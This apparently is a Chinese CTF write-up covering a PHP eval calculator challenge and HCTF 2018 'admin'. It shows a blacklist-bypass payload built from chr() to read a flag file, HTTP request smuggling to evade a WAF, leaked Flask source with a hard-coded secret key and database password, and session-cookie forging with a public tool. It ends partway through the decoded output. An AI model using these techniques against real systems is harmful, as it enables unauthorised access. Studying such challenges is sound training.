<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#黑名单解释</span><br><span class="hljs-string">/i</span> 忽略大小写<br><span class="hljs-string">/m</span>多行查找<br><span class="hljs-string">/g</span>全局匹配字符<br><span class="hljs-string">/gi</span>（<span class="hljs-string">/ig</span>)忽略大小写全局匹配字符<br></code></pre></td></tr></table></figure>

<p>有黑名单，需要GET传参num，可以看到有eval函数执行$_str=$_GET[‘num’]</p>
<p>传参试一试，<code>calc.php?num=1</code>传1可以，<code>calc.php?num=phpinfo();</code>发现传不进去，这里应该就是WAF的问题了</p>
<ul>
<li>方法一、利用字符串的解析特性</li>
</ul>
<p>学习一个知识点，就是PHP的字符串的解析特性</p>
<p>php在解析字符串时，需要将所有参数转换为有效的变量名，它的处理有两种，删除变量名前面的空格或者将空格和其他字符替换成下划线</p>
<table>
<thead>
<tr>
<th align="center">User input</th>
<th align="center">Decoded PHP</th>
<th align="center">variable name</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%20foo_bar%00</td>
<td align="center">foo_bar</td>
<td align="center">foo_bar</td>
</tr>
<tr>
<td align="center">foo%20bar%00</td>
<td align="center">foo bar</td>
<td align="center">foo_bar</td>
</tr>
<tr>
<td align="center">foo%5bbar</td>
<td align="center">foo[bar</td>
<td align="center">foo_bar</td>
</tr>
</tbody></table>
<p>所以说碰到WAF过滤变量里面的字母和非法字符时 可以考虑这个特性绕过</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/123456.png" srcset="/img/loading.gif" lazyload alt="image-20210604195546643"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604202438733.png" srcset="/img/loading.gif" lazyload alt="image-20210604202438733"></p>
<p>注意一些不能使用的函数，用var_dump()打印scandir()吧</p>
<p>这个scandir()也可以使用glob()</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604195744654.png" srcset="/img/loading.gif" lazyload alt="image-20210604195744654"></p>
<p>为空！注意到刚刚calc.php的黑名单，绕过这种正则匹配的方法比较多，但不一定有效，屡试不爽的是用代码执行顺序的逻辑漏洞，即控制输入的内容为一个待执行函数，然后黑名单匹配不到字符串，代码继续执行下去时，才会解析输入内容中的函数，可以使用ascii转换 即使用chr() 函数代替字符 </p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604200222049.png" srcset="/img/loading.gif" lazyload alt="image-20210604200222049"></p>
<p>看到有flag了</p>
<p>干脆就用chr()代替所有字符吧</p>
<p>读取<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
<p>提一嘴一些花式读取文件的操作</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">show_source</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">(strip_whitespace()</span></span>)<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(file()</span></span>)<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>



<p>拼接即可<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604201849759.png" srcset="/img/loading.gif" lazyload alt="image-20210604201849759"></p>
<ul>
<li>方法二、HTTP走私攻击(HTTP数据接收不同步攻击)</li>
</ul>
<p> <strong>漏洞形成的原因：</strong></p>
<p>前端服务器（cdn）和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞；为什么会不一致呢？</p>
<p>主要是处理Content-Length和Transfer-Encoding不一致，原则上同时使用两者时，Content-Length是无效的，当单个服务器时，没有任何问题，但当多个服务器时，理解的数据不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效，这样超出的长度就会拼接到下一次请求，从而导致漏洞。</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Content-Type重复绕过WAF</li>
</ul>
<p>?num=phpinfo();抓包<code>注意此处变量num前没有空格</code></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213630379.png" srcset="/img/loading.gif" lazyload alt="image-20210604213630379"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213654358.png" srcset="/img/loading.gif" lazyload alt="image-20210604213654358"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213744574.png" srcset="/img/loading.gif" lazyload alt="image-20210604213744574"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604214116207.png" srcset="/img/loading.gif" lazyload alt="image-20210604214116207"></p>
<p>其他走私的姿势 具体见http走私攻击.md和http-desync-attacks-ppt.pdf</p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="方法一、弱密码"><a href="#方法一、弱密码" class="headerlink" title="方法一、弱密码"></a>方法一、弱密码</h3><p>admin/123</p>
<p>我只能说这题太难了</p>
<h3 id="方法二、session伪造"><a href="#方法二、session伪造" class="headerlink" title="方法二、session伪造"></a>方法二、session伪造</h3><p>熟悉各功能点</p>
<p>查看首页源码 </p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main//2021/06/08/.png" srcset="/img/loading.gif" lazyload alt="image-20210608001745536"></p>
<p>说明这题需要admin登录 获得flag</p>
<p>继续测试各功能点 并查看源码 终于发现change password源码中出现网站源码泄露</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608002321159.png" srcset="/img/loading.gif" lazyload alt="image-20210608002321159"></p>
<p>可见是flask模板 百度一下</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608002450573.png" srcset="/img/loading.gif" lazyload alt="image-20210608002450573"></p>
<p>下载后的源码包遍历后，routes.py和config.py是可以利用的点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span><br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># 图片以二进制形式写入</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># 把buf_str作为response返回前端，并设置首部字段</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># 将验证码字符串储存在session中</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">error</span>):</span><br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#config.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>

<p>从routes.py入手看一下index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">#index.html<br>&#123;% include(&#x27;header.html&#x27;) %&#125;<br>&#123;% if current_user.is_authenticated %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br>&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% include(&#x27;footer.html&#x27;) %&#125;<br></code></pre></td></tr></table></figure>

<p>可见 session值是admin时 我们即取得flag 那么这就涉及session伪造 在routes.py找到<code>login</code>处的<code>current_user.is_authenticated</code>通过GET或者POST登录都可以 现在要解决的就是session的问题 </p>
<p>抓包看一下<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608100040088.png" srcset="/img/loading.gif" lazyload alt="image-20210608100040088"></p>
<p>百度再次查找flask框架的session问题</p>
<blockquote>
<p> flask的session是通过加密之后放到了cookie中。所以有加密就有密钥用于解密，所以，只要用到了flask的session模块就一定要配置“SECRET_KEY”这个全局宏。一般设置为24位的字符。配置方法一般有两种。</p>
<p>配置方法一：</p>
<p>新建一个config.py的文件配置secret_key </p>
<p>config.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY = <span class="hljs-string">&#x27;XXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure>

<p> 然后在主运行文件里面添加config文件里面的内容。 </p>
<p>main.py或者routes.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app = Flask(__name__)<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>.<br></code></pre></td></tr></table></figure>

<p>配置方法二：</p>
<p>直接在主运行文件里面配置。配置config的时候也是和操作字典是一样的 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app = Flask(__name__)<br><br><span class="hljs-comment">#key值可以使用随机数，或者自定义</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;XXXXX&#x27;</span> <br>或者随机数<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">24</span>)<br>或者<br>app.secret_key = <span class="hljs-string">&#x27;why would I tell you my secret key?&#x27;</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>所以伪造session就需要全局宏<code>SECRET_KEY</code></p>
<p>此时的config.py里面就是<strong>ckj123</strong></p>
<blockquote>
<p> SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’   #os.environ.get()函数的作用是获取系统的环境变量</p>
</blockquote>
<p>说到这里 暑假应该学几个主流的web框架</p>
<p>使用工具<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<blockquote>
<p>用法</p>
<h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.<span class="hljs-keyword">py</span> encode [-h] -s <span class="hljs-symbol">&lt;string&gt;</span> -t <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -t <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-structure <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie structure<br></code></pre></td></tr></table></figure>

<h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager.<span class="hljs-keyword">py</span> decode [-h] [-s <span class="hljs-symbol">&lt;string&gt;</span>] -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-value <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie value<br></code></pre></td></tr></table></figure>
</blockquote>
<p>使用工具 放入session和密钥进行解密</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;.eJw9kMFqwkAQhl-lzNlD3NiL4KGStCQwk8suw-xFrMYka2IhKhtXfPduLXgahv_j45-5w-Yw1ucWlpfxWs9g0-1heYe3b1iCZfHI-YT82WG2P4qyjhgT1GuHCpOK85SydV_puGm8EVNHquytLjwpVKKLmyizsM74yA3oipRC6yyTE2d70dRZLZFDRa7scSgmdDJZLnthSavsI6DKPekmFW08DnlSaQlxegl9S2wdhthPNyt4zGB3Hg-by8-xPr1OoIARl4S-ihT1boHavKMrW5uJrzLzp4l1j8FyfhPOg7BtbbN66rph29Qvk-H9ZPx_ctoOMYC5SmEG13M9Pr8G8wQevyIRbIY.YL7OEw.x49ZKtawASOf-9J3S9O9bWjVgTE&quot;</span> -s <span class="hljs-string">&quot;ckj123&quot;</span><br></code></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&#123;&#x27;_fresh&#x27;: False, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span 